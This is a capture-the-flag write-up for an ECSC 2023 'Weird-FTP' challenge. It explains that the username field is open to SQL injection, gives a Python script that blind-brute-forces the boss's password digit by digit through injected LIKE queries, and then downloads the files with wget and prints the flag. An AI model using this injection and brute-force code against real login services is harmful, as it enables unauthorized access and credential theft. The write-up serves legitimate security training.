# Weird-FTP

We get access to a weird bugged FTP server.

After logging in with provided credentials we see two files: AUDIT_PLAN.TXT and dbschema.sql
```sql
#
# TABLE STRUCTURE FOR: employees
#

DROP TABLE IF EXISTS `employees`;

CREATE TABLE `employees` (
  `id` int(9) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `password` varchar(255) NOT NULL,
  `home_dir` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

# All passwords are 16 digits, letters are not used because they could not be entered in case we want to use pin-pads for login
# Passwords provided below are examples.
INSERT INTO `employees` (`id`, `username`, `password`, `home_dir`) VALUES (1, 'boss', '0000000000000000', '/home/boss');
INSERT INTO `employees` (`id`, `username`, `password`, `home_dir`) VALUES (2, 'auditor', '0000000000000000', '/home/auditor');

```
This highly suggests that FTP authentication is done by querying SQL users.
So, we try SQL injection!

After experimenting, we see that `password` is not vulnerable, only `username` is.

`ENGINE=InnoDB` in dbschema.sql tells us that we should use `#` as the comment character.

We can login as boss by passing `boss' #` as username, but that doesn't give us access to the files - we have to find the actual password. We can do this by brute forcing the query.

solve.py
```py
from ftplib import FTP, error_temp
import string
import time

alphabet = string.digits

def try_query(query):
    ftp = FTP()
    ftp.connect('ftp.ecsc23.hack.cert.pl', 5005)
    ftp.set_pasv(True)
    # ftp.set_debuglevel(1)
    ftp.login(query, '8555998981517280')

    r = []
    ftp.dir(r.append)
    print(r)
    if len(r) != 1 or 'BAD_AUTH' in r[0]:
        return False
    
    return True

def is_query_ok(query):
    while True:
        try: 
            try_query(query)
            return False
        except KeyboardInterrupt: exit()
        except error_temp as e:
            print(e)
        except:
            return True
        time.sleep(0.1)

# brute force password
passwd = ''
while True:
    for c in alphabet:
        print(passwd+c)
        res = is_query_ok(f"boss' AND password like '{passwd+c}%' #")
        
        if res:
            passwd += c
            print(passwd)
            break
        time.sleep(0.1)

    if len(passwd) == 16:
        print('found')
        break

print(passwd) # 7897812918028196
```

Using `ftp` command to retrieve the flag didn't work for me for some reason, so I had to use `wget`

```sh
wget -m ftp://boss:7897812918028196@ftp.ecsc23.hack.cert.pl:5005
```

`ecsc23{863b2b472ee544109a7b066256df0ea5}`